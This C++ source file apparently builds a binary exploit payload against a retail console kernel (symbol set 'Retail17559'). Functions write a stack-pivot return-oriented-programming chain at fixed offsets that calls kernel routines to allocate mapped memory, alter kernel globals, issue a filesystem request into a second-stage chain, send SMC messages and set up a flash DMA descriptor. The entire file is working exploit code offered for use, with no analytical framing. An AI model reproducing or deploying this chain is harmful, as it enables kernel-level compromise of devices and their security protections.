#include "payload_builder.hpp"

#include <array>
#include <initializer_list>
#include <stdexcept>

namespace bandwagon::flash_dma {
namespace {

constexpr std::uint32_t kCfR6 = 0x27272727;
constexpr std::uint32_t kCfR5 = 0x28282828;
constexpr std::uint32_t kCfR4 = 0x29292929;
constexpr std::uint32_t kCfR3 = 0x30303030;
constexpr std::uint32_t kCfR3Default = 0x31313131;
constexpr std::uint32_t kCfR8 = 0x25252525;
constexpr std::uint32_t kScratchWord = 0x41414141;

struct WordWrite {
  std::uint32_t offset;
  std::uint32_t value;
};

using Payload = std::array<std::uint8_t, kPayloadSize>;

void StoreBigEndian(Payload* output, std::uint32_t offset,
                    std::uint32_t value) {
  if (offset > output->size() - sizeof(value) || (offset & 3) != 0)
    throw std::out_of_range("Flash DMA word offset");
  (*output)[offset] = static_cast<std::uint8_t>(value >> 24);
  (*output)[offset + 1] = static_cast<std::uint8_t>(value >> 16);
  (*output)[offset + 2] = static_cast<std::uint8_t>(value >> 8);
  (*output)[offset + 3] = static_cast<std::uint8_t>(value);
}

void StoreWords(Payload* output, std::initializer_list<WordWrite> words) {
  for (const auto& word : words) StoreBigEndian(output, word.offset, word.value);
}

void WriteInitialStackSwitch(Payload* output,
                             const Retail17559Symbols& symbols) {
  StoreWords(output, {
      {0x01f0, kPayloadBase + 0x0200},
      {0x01f8, symbols.ke_set_current_stack_pointers},
  });
}

void WriteRopStackPreparation(Payload* output,
                              const Retail17559Symbols& symbols) {
  // Two stack-pivot records followed by CALL_FUNC-compatible register-save
  // slots. Repeated values are intentional paired register restores.
  StoreWords(output, {
      {0x0250, kCfR6}, {0x0254, kCfR6}, {0x0258, kCfR5},
      {0x025c, kCfR5}, {0x0260, kCfR4}, {0x0264, kCfR4},
      {0x0274, kPayloadBase + 0x0df0},
      {0x0278, symbols.stack_pivot_entry},
      {0x02d0, kCfR6}, {0x02d4, kCfR6}, {0x02d8, kCfR5},
      {0x02dc, kCfR5}, {0x02e0, kCfR4}, {0x02e4, kCfR4},
      {0x02f4, kPayloadBase + 0x0de4},
      {0x02f8, symbols.stack_pivot_entry},
      {0x0350, kCfR6}, {0x0354, kCfR6}, {0x0358, kCfR5},
      {0x035c, kCfR5}, {0x0360, kCfR4}, {0x0364, kCfR4},
      {0x0368, kCfR3}, {0x036c, kCfR3},
      {0x0370, kCfR3Default}, {0x0374, kCfR3Default},
      {0x0378, symbols.restgprlr_31},
  });
}

void WriteMappedMemoryCall(Payload* output,
                           const Retail17559Symbols& symbols) {
  // MiAllocateMappedMemory(2, 0x7c000, 4, 0x11, MmSystemPfnRegion, ...).
  StoreWords(output, {
      {0x03d4, symbols.restgprlr_31},
      {0x03d8, symbols.move_r31_to_r11},
      {0x0438, kCfR3}, {0x043c, kCfR3},
      {0x0440, kCfR3Default}, {0x0444, kCfR3Default},
      {0x0448, symbols.restgprlr_25},
      {0x04ac, 2},
      {0x04b4, 0x0007c000},
      {0x04bc, 4},
      {0x04c4, 0x11},
      {0x04c8, kCfR3}, {0x04cc, kCfR3},
      {0x04d4, symbols.mm_system_pfn_region},
      {0x04d8, symbols.call_preload},
      {0x0534, symbols.mi_allocate_mapped_memory},
      {0x0538, symbols.call_dispatch},
  });
}

void WriteCapturedAllocation(Payload* output,
                             const Retail17559Symbols& symbols) {
  StoreWords(output, {
      {0x0594, kPayloadBase + 0x0e3c},
      {0x0598, symbols.move_r31_to_r3},
      {0x0604, symbols.load_r3_from_r3},
      {0x0608, symbols.call_dispatch},
      {0x0664, kPayloadBase + 0x0e68},
      {0x0668, symbols.store_r3},
  });
}

void WriteKernelGlobalFlow(Payload* output,
                           const Retail17559Symbols& symbols) {
  // The first private global is updated by 0xbc4 through a recovered gadget.
  // A value reached through the second is then copied to payload word 0xe38.
  StoreWords(output, {
      {0x06c4, symbols.restgprlr_31},
      {0x06c8, symbols.move_r31_to_r11},
      {0x0728, kCfR3}, {0x072c, kCfR3},
      {0x0730, kCfR3Default}, {0x0734, kCfR3Default},
      {0x0738, symbols.restgprlr_29},
      {0x0794, 0x00000bc4},
      {0x0798, kCfR3}, {0x079c, kCfR3},
      {0x07a0, kCfR3Default}, {0x07a4, kCfR3Default},
      {0x07a8, symbols.call_preload + 0x10},
      {0x0804, symbols.unresolved_global_801c7f80},
      {0x0808, symbols.move_r31_to_r11},
      {0x0868, kCfR3}, {0x086c, kCfR3},
      {0x0874, symbols.load_add_store_r3_r4_on_r11},
      {0x0878, symbols.call_dispatch},
      {0x08d4, symbols.unresolved_global_801a614c},
      {0x08d8, symbols.move_r31_to_r3},
      {0x0944, symbols.load_r11_from_r3},
      {0x0948, symbols.call_dispatch},
      {0x09a4, kPayloadBase + 0x0e38},
      {0x09a8, symbols.move_r31_to_r3},
      {0x0a14, symbols.load_r3_from_r3},
      {0x0a18, symbols.call_dispatch},
      {0x0a74, symbols.store_r11_on_r3},
      {0x0a78, symbols.call_dispatch},
  });
}

void WriteSynchronousRequest(Payload* output,
                             const Retail17559Symbols& symbols) {
  StoreWords(output, {
      {0x0ad4, symbols.restgprlr_31},
      {0x0ad8, symbols.move_r31_to_r11},
      {0x0b38, kCfR3}, {0x0b3c, kCfR3},
      {0x0b40, kCfR3Default}, {0x0b44, kCfR3Default},
      {0x0b48, symbols.restgprlr_25},
      {0x0ba0, kCfR8}, {0x0ba4, kCfR8},
      {0x0bac, kPayloadBase + 0x0e60},
      {0x0bb4, 0x0007c000},
      {0x0bbc, kStage2RopBase},
      {0x0bc4, kScratchWord},
      {0x0bc8, kCfR3}, {0x0bcc, kCfR3},
      {0x0bd4, 2},
      {0x0bd8, symbols.call_preload},
      {0x0c34, symbols.io_synchronous_fsd_request},
      {0x0c38, symbols.call_dispatch},
  });
}

void WriteStage2Return(Payload* output,
                       const Retail17559Symbols& symbols) {
  StoreWords(output, {
      {0x0c94, symbols.restgprlr_31},
      {0x0c98, symbols.move_r31_to_r11},
      {0x0cf8, kCfR3}, {0x0cfc, kCfR3},
      {0x0d00, kCfR3Default}, {0x0d04, kCfR3Default},
      {0x0d08, symbols.restgprlr_25},
      {0x0d60, kCfR8}, {0x0d64, kCfR8},
      {0x0d6c, kStage2RopBase},
      {0x0d74, 0x7a09c000},
      {0x0d78, kCfR5}, {0x0d7c, kCfR5},
      {0x0d84, kStage2RopBase},
      {0x0d88, kCfR3}, {0x0d8c, kCfR3},
      {0x0d94, kStage2RopBase + 0x2000},
      {0x0d98, symbols.call_preload},
      {0x0df4, symbols.ke_set_current_stack_pointers},
      {0x0df8, symbols.call_dispatch},
  });
}

void WriteSmcAndDmaControl(Payload* output,
                           const Retail17559Symbols& symbols) {
  StoreWords(output, {
      {0x0e00, kPayloadBase + 0x0e30},
      {0x0e08, symbols.hal_send_smc_message},
      {0x0e0c, 0x00004e20},
      {0x0e14, symbols.ke_stall_execution_processor},
      {0x0e18, kPayloadBase + 0x0e40},
      {0x0e20, symbols.hal_send_smc_message},
      {0x0e24, kPayloadBase + 0x0e50},
      {0x0e2c, symbols.hal_send_smc_message},
      {0x0e30, 0x99ffff00},
      {0x0e40, 0xa0010000},
      {0x0e50, 0xa0000000},
      {0x0e64, 0x00004000},
      {0x0e6c, kPayloadBase},
  });
}

void WriteDmaDescriptor(Payload* output) {
  StoreWords(output, {
      {0x1400, 0x00b11c00},
      {0x1404, 0x20000000},
      {0x1408, 0x20b11c00},
      {0x140c, 0xc0010000},
      {0x1410, 0x40388700},
      {0x1414, 0x20000080},
  });
}

void WriteScratchSector(Payload* output) {
  for (std::uint32_t offset = 0x1600; offset < 0x1800; offset += 4)
    StoreBigEndian(output, offset, kScratchWord);
}

constexpr std::array<Operation, 14> kOperations{{
    {OperationKind::kSwitchToPayloadStack, 0x01f0,
     kPayloadBase + 0x0200, 0},
    {OperationKind::kPrepareRopStack, 0x0250,
     kPayloadBase + 0x0df0, kPayloadBase + 0x0de4},
    {OperationKind::kAllocateMappedMemory, 0x03d4, 0x0007c000, 0x11},
    {OperationKind::kCaptureAllocationResult, 0x0594,
     kPayloadBase + 0x0e3c, kPayloadBase + 0x0e68},
    {OperationKind::kUpdateUnresolvedKernelGlobal, 0x06c4,
     0x801c7f80, 0x00000bc4},
    {OperationKind::kCopyUnresolvedKernelGlobalValue, 0x08d4,
     0x801a614c, kPayloadBase + 0x0e38},
    {OperationKind::kIssueSynchronousFsdRequest, 0x0ad4,
     kStage2RopBase, 0x0007c000},
    {OperationKind::kRestoreStage2Stack, 0x0c94,
     kStage2RopBase + 0x2000, 0x7a09c000},
    {OperationKind::kSendSmcMessage, 0x0e00, 0x99ffff00, 0},
    {OperationKind::kStallProcessor, 0x0e0c, 0x00004e20, 0},
    {OperationKind::kSendSmcMessage, 0x0e18, 0xa0010000, 0},
    {OperationKind::kSendSmcMessage, 0x0e24, 0xa0000000, 0},
    {OperationKind::kDefineDmaDescriptor, 0x1400, 6, 0},
    {OperationKind::kProvideScratchSector, 0x1600, 0x200, 0x41},
}};

}  // namespace

const std::array<Operation, 14>& FlashDmaOperations() { return kOperations; }

std::string_view OperationName(OperationKind kind) {
  switch (kind) {
    case OperationKind::kSwitchToPayloadStack: return "switch to payload stack";
    case OperationKind::kPrepareRopStack: return "prepare ROP stack";
    case OperationKind::kAllocateMappedMemory: return "allocate mapped memory";
    case OperationKind::kCaptureAllocationResult: return "capture allocation result";
    case OperationKind::kUpdateUnresolvedKernelGlobal:
      return "update unresolved kernel global";
    case OperationKind::kCopyUnresolvedKernelGlobalValue:
      return "copy unresolved kernel global value";
    case OperationKind::kIssueSynchronousFsdRequest:
      return "issue synchronous FSD request";
    case OperationKind::kRestoreStage2Stack: return "restore Stage2 stack";
    case OperationKind::kSendSmcMessage: return "send SMC message";
    case OperationKind::kStallProcessor: return "stall processor";
    case OperationKind::kDefineDmaDescriptor: return "define DMA descriptor";
    case OperationKind::kProvideScratchSector: return "provide scratch sector";
  }
  return "unknown";
}

std::array<std::uint8_t, kPayloadSize> BuildFlashDmaPayload(
    const Retail17559Symbols& symbols) {
  Payload result{};
  WriteInitialStackSwitch(&result, symbols);
  WriteRopStackPreparation(&result, symbols);
  WriteMappedMemoryCall(&result, symbols);
  WriteCapturedAllocation(&result, symbols);
  WriteKernelGlobalFlow(&result, symbols);
  WriteSynchronousRequest(&result, symbols);
  WriteStage2Return(&result, symbols);
  WriteSmcAndDmaControl(&result, symbols);
  WriteDmaDescriptor(&result);
  WriteScratchSector(&result);
  return result;
}

}  // namespace bandwagon::flash_dma
